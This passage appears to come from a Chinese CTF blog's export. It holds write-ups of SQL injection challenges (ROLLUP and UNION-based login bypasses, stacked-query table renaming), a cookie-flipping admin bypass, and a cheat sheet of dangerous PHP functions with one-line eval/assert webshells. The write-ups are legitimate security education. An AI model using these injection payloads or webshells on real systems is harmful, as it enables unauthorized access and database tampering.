target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/pcat/source.txt</a> 得到题目源代码：</p><pre><code>&lt;?phperror_reporting(0);if (!isset($_POST[&#39;uname&#39;]) || !isset($_POST[&#39;pwd&#39;])) {    echo ‘&lt;form action=”&quot; method=”post”&gt;’.”&lt;br/&gt;”;    echo ‘&lt;input name=”uname” type=”text”/&gt;’.”&lt;br/&gt;”;    echo ‘&lt;input name=”pwd” type=”text”/&gt;’.”&lt;br/&gt;”;    echo ‘&lt;input type=”submit” /&gt;’.”&lt;br/&gt;”;    echo ‘&lt;/form&gt;’.”&lt;br/&gt;”;    echo ‘&lt;!–source: source.txt–&gt;’.”&lt;br/&gt;”;    die;}function AttackFilter($StrKey,$StrValue,$ArrReq){      if (is_array($StrValue)){        $StrValue=implode($StrValue);    }    if (preg_match(“/”.$ArrReq.”/is”,$StrValue)==1){           print “水可载舟，亦可赛艇！”;        exit();    }}$filter = “and|select|from|where|union|join|sleep|benchmark|,|\(|\)”;foreach($_POST as $key=&gt;$value){     AttackFilter($key,$value,$filter);}$con = mysql_connect(“XXXXXX”,”XXXXXX”,”XXXXXX”);if (!$con){    die(‘Could not connect: ‘ . mysql_error());}$db=”XXXXXX”;mysql_select_db($db, $con);$sql=”SELECT * FROM interest WHERE uname = ‘{$_POST[&#39;uname&#39;]}’”;$query = mysql_query($sql); if (mysql_num_rows($query) == 1) {     $key = mysql_fetch_array($query);    if($key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]) {        print “CTF{XXXXXX}”;    }else{        print “亦可赛艇！”;    }}else{    print “一颗赛艇！”;}mysql_close($con);?&gt;</code></pre><p>从源代码得出，注入点在uname这个位置上，$filter没有过滤掉 or </p><p>注入成功要满足几个条件：</p><ol><li><p>mysql_num_rows($query) == 1 即查询返回的结果行数为1</p></li><li><p>$key[‘pwd’] == $_POST[‘pwd’] 即查询返回的结果与POST发送的pwd值相同</p></li></ol><p>解题： </p><p>group by pass with rollup 的技巧</p><pre><code>mysql&gt; select user from users group by user;+———+| user    |+———+| 1337    || admin   || gordonb || pablo   || smithy  |+———+5 rows in setmysql&gt; select user from users group by user with rollup;+———+| user    |+———+| 1337    || admin   || gordonb || pablo   || smithy  || NULL    |+———+6 rows in set</code></pre><p>可以发现，在加上with rollup之后，返回pass最后一行多了一个NULL。当我们POST的pass为空，即可满足$key[‘pwd’] == $_POST[‘pwd’]条件。</p><p>如何让返回的结果只取最后一行呢？ </p><p>因为过滤了,所以无法使用limit 5,1这样的语法 </p><p>可以使用limit 1 offset 5</p><p>mysql&gt; select user from users group by 1 with rollup limit 1 offset 5;</p><p>+——+</p><p>| user |</p><p>+——+</p><p>| NULL |</p><p>+——+</p><p>1 row in set</p><p>所以最终 payload 如下，2为遍历出来的值 。</p><p>uname=’ or 1=1 group by pwd with rollup limit 1 offset 2#&amp;pwd=</p><h2 id="万能密码—-程序逻辑"><a href="#万能密码—-程序逻辑" class="headerlink" title="万能密码— 程序逻辑"></a>万能密码— 程序逻辑</h2><p>题目入口： <a href="http://ctf5.shiyanbar.com/web/5/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/5/index.php</a> </p><p>题目来源：实验吧，程序逻辑问题 </p><p>本题源代码：<a href="http://ctf5.shiyanbar.com/web/5/index.txt" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/5/index.txt</a></p><pre><code>&lt;html&gt;&lt;head&gt;welcome to simplexue&lt;/head&gt;&lt;body&gt;&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) {    $conn = mysql_connect(“********, “*****”, “********”);    mysql_select_db(“phpformysql”) or die(“Could not select database”);    if ($conn-&gt;connect_error) {        die(“Connection failed: ” . mysql_error($conn));} $user = $_POST[user];$pass = md5($_POST[pass]);$sql = “select pw from php where user=’$user’”;$query = mysql_query($sql);if (!$query) {    printf(“Error: %s\n”, mysql_error($conn));    exit();}</code></pre><p>$row = mysql_fetch_array($query, MYSQL_ASSOC);</p><pre><code>//echo $row[&quot;pw&quot;];  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) {    echo “&lt;p&gt;Logged in! Key:************** &lt;/p&gt;”;}else {    echo(“&lt;p&gt;Log in failure!&lt;/p&gt;”);  }}?&gt;&lt;form method=post action=index.php&gt;&lt;input type=text name=user value=”Username”&gt;&lt;input type=password name=pass value=”Password”&gt;&lt;input type=submit&gt;&lt;/form&gt;&lt;/body&gt;&lt;a href=”index.txt”&gt;&lt;/html&gt;</code></pre><p>首先可以发现user处存在注入点，并且会回显错误信息，第一个想到的是报错注入。</p><pre><code>user=admin’and (extractvalue(1,concat(0x7e,(select pw from php where user =’admin’ limit 0,1),0x7e)))#&amp;pass=111</code></pre><p>结果密码并不是admin/111</p><pre><code>user=admin’and (extractvalue(1,concat(0x7e,(select pw from phpformysql.php limit 0,1),0x7e)))#&amp;pass=111</code></pre><p>结果提示：</p><p><img src="/img/8.jpg" srcset="/img/loading.gif" alt=""></p><p>既然是程序逻辑漏洞，然就继续看代码吧。</p><pre><code>if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) {    echo “&lt;p&gt;Logged in! Key:************** &lt;/p&gt;”;}</code></pre><p>判断sql查询返回的值和$pass做比较。strcasecmp比较两个字符串，且不区分大小写，相等返回0。 </p><p>既然user存在注入，我们可以让返回的结果为任何值，只要等于我们输入pass的md5值。 </p><p>如：reborn的md5加密的值为5ce3c6e5c3f84bdc0f45148adfd16ae6 </p><p>因此我们可以构造payload： </p><p>user=’union select ’5ce3c6e5c3f84bdc0f45148adfd16ae6′#&amp;pass=reborn </p><p>结果：<br><img src="/img/9.jpg" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jarvis OJ admin</title>
    <link href="/2019/12/22/Jarvis-OJ-admin/"/>
    <url>/2019/12/22/Jarvis-OJ-admin/</url>
    
    <content type="html"><![CDATA[<h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><hr><p>题目链接：http ://web.jarvisoj.com:32792 /</p><p>点开页面后是一个hello world，看了看F12什么都没发现，用bp也没发现什么东西。用御剑先扫一波，马上发现了robots.txt。</p><a id="more"></a><p>进去后出现了：</p><blockquote><p>Disallow: /admin_s3cr3t.php</p></blockquote><p>激动的点开了网站</p><p><img src="/img/1.png" srcset="/img/loading.gif" alt=""></p><p>提交以后发现是错的。<br>再次进入网站用bp拦截，发现cookie的值是</p><blockquote><p>admin = 0</p></blockquote><p>将0改成1.出现flag。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web，JARvis OJ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP代码漏洞（一）</title>
    <link href="/2019/12/22/PHP%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2019/12/22/PHP%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h1><h2 id="php代码执行相关"><a href="#php代码执行相关" class="headerlink" title="php代码执行相关"></a>php代码执行相关</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>mixed eval ( string $code )<br>把字符串code作为php代码执行。常见的一句话木马：</p><a id="more"></a><p>（<code>)&lt;?php    eval($_GET[&#39;pass&#39;])?&gt;(</code>)<br>访问：</p><blockquote><p><a href="http://xxx/codeexec.php?pass=phpinfo()" target="_blank" rel="noopener">http://xxx/codeexec.php?pass=phpinfo()</a>;</p></blockquote><p>得到phpinfo()页面。</p><h2 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h2><p>PHP 5</p><p>bool assert ( mixed $assertion [, string $description ] )<br>PHP 7</p><p>bool assert ( mixed $assertion [, Throwable $exception ] )<br>assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的响应。如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</p><p>一句话木马：<br>(<code>)&lt;?php    assert($_GET[&#39;pass&#39;]);?&gt;(</code>)<br>访问：</p><blockquote><p><a href="http://xxx/codeexec.php?pass=phpinfo()" target="_blank" rel="noopener">http://xxx/codeexec.php?pass=phpinfo()</a></p></blockquote><p>phpinfo()后可以不用分号。得到phpinfo()页面。</p><h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h2><p>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )<br>搜索subject中匹配pattern的部分， 以replacement进行替换。当使用被弃用的 e 修饰符时, 这个函数会转义一些字符，在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串<br>更详细的说明见：php-preg_replace</p><h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h2><p>mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $… ]] )<br>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 传入call_user_func()的参数不能为引用传递。<br>(<code>)&lt;?php    call_user_func($_GET[&#39;chybeta&#39;],$_GET[&#39;ph0en1x&#39;]);?&gt;(</code>)</p><p>访问：</p><blockquote><p><a href="http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x=phpinfo()" target="_blank" rel="noopener">http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x=phpinfo()</a></p></blockquote><h2 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h2><p>mixed call_user_func_array ( callable $callback , array $param_arr )<br>把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。<br>(<code>)&lt;?php    call_user_func_array($_GET[&#39;chybeta&#39;],$_GET[&#39;ph0en1x&#39;]);?&gt;(</code>)</p><p>访问：</p><blockquote><p><a href="http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x[]=phpinfo()" target="_blank" rel="noopener">http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x[]=phpinfo()</a></p></blockquote><h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h2><p>string create_function ( string $args , string $code )<br>该函数的内部实现用到了eval，所以也具有相同的安全问题。第一个参数args是后面定义函数的参数，第二个参数是函数的代码。<br>(<code>)&lt;?php    $a = $_GET[&#39;chybeta&#39;];    $b = create_function(&#39;$a&#39;,&quot;echo $a&quot;);    $b(&#39;&#39;);?&gt;(</code>)</p><p>访问：</p><blockquote><p><a href="http://localhost:2500/codeexec.php" target="_blank" rel="noopener">http://localhost:2500/codeexec.php</a><br>?chybeta=phpinfo();</p></blockquote><p>##array_map()<br>array array_map ( callable $callback , array $array1 [, array $… ] )<br>作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。<br>(<code>)&lt;?php    $array = array(0,1,2,3,4,5);    array_map($_GET[&#39;chybeta&#39;],$array);?&gt;(</code>)<br>访问：</p><blockquote><p><a href="http://localhost:2500/codeexec.php" target="_blank" rel="noopener">http://localhost:2500/codeexec.php</a><br>?chybeta=phpinfo</p></blockquote><p>注意没有括号()和分号;。</p><h1 id="系统命令执行相关"><a href="#系统命令执行相关" class="headerlink" title="系统命令执行相关"></a>系统命令执行相关</h1><h2 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h2><p>string system ( string $command [, int &amp;$return_var ] )<br>command是要执行的命令。return_var，如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。<br>(<code>)&lt;?php    system(&quot;whoami&quot;);?&gt;(</code>)<br>会看到运行了shell命令，并打印回显到页面上。</p><h2 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h2><p>void passthru ( string $command [, int &amp;$return_var ] )<br>command是要执行的命令。return_var，如果提供 return_var 参数， Unix 命令的返回状态会被记录到此参数。<br>(<code>)&lt;?php    passthru(&quot;whoami&quot;);?&gt;(</code>)</p><h2 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h2><p>string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )<br>exec() 执行 command 参数所指定的命令。 其余参数，见文档<br>(<code>)&lt;?php    echo exec(&quot;whoami&quot;);?&gt;(</code>)</p><h2 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h2><p>void pcntl_exec ( string $path [, array $args [, array $envs ]] )<br>path是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本<br>args是一个要传递给程序的参数的字符串数组。<br>(<code>)&lt;?php    pcntl_exec ( &quot;/bin/bash&quot; , array(&quot;whoami&quot;));?&gt;(</code>)</p><h2 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h2><p>string shell_exec ( string $cmd )<br>cmd是要执行的命令。<br>(<code>)&lt;?php    echo shell_exec(&quot;whoami&quot;);?&gt;(</code>)</p><h2 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h2><p>resource popen ( string $command , string $mode )<br>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。 后面的mode，当为 ‘r’，返回的文件指针等于命令的 STDOUT，当为 ‘w’，返回的文件指针等于命令的 STDIN。<br>(<code>)&lt;?php$handle = popen(&quot;/bin/ls&quot;, &quot;r&quot;);?&gt;(</code>)</p><h2 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h2><p>resource proc_open ( string $cmd , array $descriptorspec , array &amp;$pipes [, string $cwd [, array $env [, array $other_options ]]] )<br>cmd是要执行的命令，其余见文档</p><p><code>(反单引号)在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“</code>”的效果与函数 shell_exec() 相同。<br>(<code>)&lt;?php    echo `whoami`;?&gt;(</code>)<br>##ob_start()<br>bool ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )<br>此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。</p><p>可选参数 output_callback 函数可以被指定。 此函数把一个字符串当作参数并返回一个字符串。 当输出缓冲区被( ob_flush(), ob_clean() 或者相似的函数)冲刷（送出）或者被清洗的时候；或者在请求结束之际输出缓冲区内容被冲刷到浏览器的时候该函数将会被调用。 当调用 output_callback 时，它将收到输出缓冲区的内容作为参数 并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器。</p><p>下面的代码，由于调用了ob_end_flush()，所以会调用ob_start(cmd)中的cmd，把我们输入的_GET[a]作为cmd的参数。<br>(<code>)&lt;?php    $cmd = &#39;system&#39;;    ob_start($cmd);    echo &quot;$_GET[a]&quot;;    ob_end_flush();?&gt;(</code>)<br>访问：</p><blockquote><p><a href="http://localhost:2500/codeexec.php?a=whoami" target="_blank" rel="noopener">http://localhost:2500/codeexec.php?a=whoami</a></p></blockquote><h2 id="php-mail"><a href="#php-mail" class="headerlink" title="php mail()"></a>php mail()</h2><p>mail 文档<br>(<code>)bool mail (    string $to ,    string $subject ,    string $message [,    string $additional_headers [,    string $additional_parameters ]])(</code>)<br>要使用mail()函数，需要配置对应的服务器等，在php.ini中有两个选项：</p><p>配置SMTP服务器的主机名和端口<br>配置PHP用作邮件传输代理（MTA）的文件路径<br>当PHP配置了第二个选项时，对该mail()函数的调用将导致执行配置对MTA程序。虽然PHP内部使用escapeshellcmd()用于程序调用，防止新的shell命令注入，但第5个参数$additional_parameters中mail()允许添加的新程序。因此，攻击者可以附加程序标志，在某些MTA中可以创建具有用户控制内容的文件</p>]]></content>
    
    
    <categories>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆叠注入</title>
    <link href="/2019/12/21/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
    <url>/2019/12/21/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>##堆叠注入</p><p>预编译绕过<br>预编译相关语法如下：</p><a id="more"></a><p>set用于设置变量名和值<br>prepare用于预备一个语句，并赋予名称，以后可以引用该语句<br>execute执行语句<br>deallocate prepare用来释放掉预处理的语句</p><p>直接看payload就懂了：</p><p>-1’;set @sql = CONCAT(‘se’,’lect * from <code>1919810931114514</code>;’);prepare stmt from @sql;EXECUTE stmt;#</p><p>拆分开来如下<br>-1’;<br>set @sql = CONCAT(‘se’,’lect * from <code>1919810931114514</code>;’);<br>prepare stmt from @sql;<br>EXECUTE stmt;</p><p>我们将表1919810931114514名字改为words，flag列名字改为id，那么就能得到flag的内容了。</p><p>修改表名和列名的语法如下：</p><p>修改表名(将表名user改为users)<br>alter table user rename to users;</p><p>修改列名(将字段名username改为name)<br>alter table users change uesrname name varchar(30);</p><p>最终payload如下：</p><p>1’; alter table words rename to words1;alter table <code>1919810931114514</code> rename to words;alter table words change flag id varchar(50);#</p><p>拆分开来如下<br>1’;<br>alter table words rename to words1;<br>alter table <code>1919810931114514</code> rename to words;<br>alter table words change flag id varchar(50);</p>]]></content>
    
    
    <categories>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jarvis OJ port 51</title>
    <link href="/2019/12/21/Jarvis-OJ-port-51/"/>
    <url>/2019/12/21/Jarvis-OJ-port-51/</url>
    
    <content type="html"><![CDATA[<p>题目链接: <a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">http://web.jarvisoj.com:32770/</a><br>访问页面之后，页面显示：</p><p>Please use port 51 to visit this site.</p><p>当时看到了这个还以为是需要访问这个网站的51端口，但是这个网址已经确定了是访问32770端口，后来一直都没有思路。最后才发现是要求本地以51端口去访问这个网址。payload如下：</p><a id="more"></a><blockquote><p>curl –local-port 51 <a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">http://web.jarvisoj.com:32770/</a></p></blockquote><p>最后就可以拿到flag</p><hr><p>curl，全称CommandLine URL 或 CommandLine Uniform Resource Locator，顾名思义，curl命令是在命令行方式下工作，利用URL的语法进行数据的传输或者文件的传输。</p><p><strong>CURL具体用法</strong><br>(<a href="https://itbilu.com/linux/man/4yZ9qH_7X.html" target="_blank" rel="noopener">https://itbilu.com/linux/man/4yZ9qH_7X.html</a>)</p>]]></content>
    
    
    <categories>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>Jarvis OJ</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
